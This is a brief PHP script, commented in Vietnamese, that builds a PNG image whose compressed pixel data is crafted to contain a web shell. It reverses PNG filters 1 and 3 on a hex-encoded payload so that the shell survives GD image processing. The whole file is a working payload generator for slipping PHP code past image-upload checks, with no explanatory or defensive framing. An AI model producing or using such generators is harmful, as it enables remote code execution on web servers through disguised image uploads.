<?php
    $s = '03a39f67546f2c24152b216712546f112e29152b1967226b6f5f50'; // Khi zlib.compress() chuỗi đó sẽ có web shell
    $p1 = str_split(hex2bin($s));
    for ($i = 0; $i < count($p1); ++$i)
        $p1[$i] = ord($p1[$i]);

    $p3 = $p1;
    
    // Reverse Filter 1
    $s = count($p1);
    for ($i = 0; $i < $s; ++$i)
        $p1[$i + 3] = ($p1[$i + 3] + $p1[$i]) % 256;

    // Reverse Filter 3 
    for ($i = 0; $i < $s; ++$i)
        $p3[$i + 3] = ($p3[$i + 3] + floor($p3[$i] / 2)) % 256;

    for ($i = 0; $i < count($p3); $i++)
        array_push($p1, $p3[$i]);

    $sz = 32;
    $img = imagecreatetruecolor($sz, $sz);
    for ($i = 0; $i < count($p1); $i += 3) 
    {
        $r = $p1[$i];
        $g = $p1[$i + 1];
        $b = $p1[$i + 2];
        $color = imagecolorallocate($img, $r, $g, $b);
        imagesetpixel($img, round($i / 3), 0, $color);
    }

    imagepng($img);
?>
